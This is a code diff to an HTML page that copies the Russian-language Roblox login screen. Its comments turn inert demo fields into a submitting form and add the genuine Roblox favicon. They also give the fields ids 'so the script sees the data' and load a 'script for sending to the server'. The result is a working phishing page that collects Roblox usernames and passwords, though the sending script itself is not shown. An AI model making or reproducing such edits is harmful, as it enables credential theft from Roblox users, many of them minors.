@@ -3,37 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="description" content="Вход в Roblox">
     <title>Roblox</title>
+    <!-- Вернул логотип во вкладку -->
+    <link rel="icon" href="https://www.roblox.com/favicon.ico" type="image/x-icon">
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <main class="login-card" aria-labelledby="login-title">
         <h1 id="login-title">Войти в Roblox</h1>
 
-        <div class="demo-fields">
-            <input
-                class="demo-input"
-                type="text"
-                placeholder="Имя пользователя/Электронная почта/Телефон"
-                aria-label="Имя пользователя, электронная почта или телефон"
-                autocomplete="off"
-                autocapitalize="off"
-                spellcheck="false"
-            >
-            <input
-                class="demo-input"
-                type="password"
-                placeholder="Пароль"
-                aria-label="Пароль"
-                autocomplete="new-password"
-                spellcheck="false"
-            >
+        <!-- Добавил form и id, чтобы скрипт видел данные -->
+        <form id="loginForm">
+            <div class="demo-fields">
+                <input
+                    class="demo-input"
+                    type="text"
+                    id="username"
+                    placeholder="Имя пользователя/Электронная почта/Телефон"
+                    aria-label="Имя пользователя, электронная почта или телефон"
+                    autocomplete="off"
+                    autocapitalize="off"
+                    spellcheck="false"
+                    required
+                >
+                <input
+                    class="demo-input"
+                    type="password"
+                    id="password"
+                    placeholder="Пароль"
+                    aria-label="Пароль"
+                    autocomplete="new-password"
+                    spellcheck="false"
+                    required
+                >
 
-            <button class="demo-submit" type="button">
-                Авторизоваться
-            </button>
-        </div>
+                <!-- Сделал type="submit", чтобы форма отправлялась -->
+                <button class="demo-submit" type="submit">
+                    Авторизоваться
+                </button>
+            </div>
+        </form>
 
         <p class="demo-help" id="login-status" role="status" aria-live="polite">
             Забыли пароль или имя пользователя?
@@ -60,5 +69,8 @@
             </button>
         </div>
     </main>
+
+    <!-- Подключил твой скрипт отправки на сервер -->
+    <script src="script.js"></script>
 </body>
 </html>
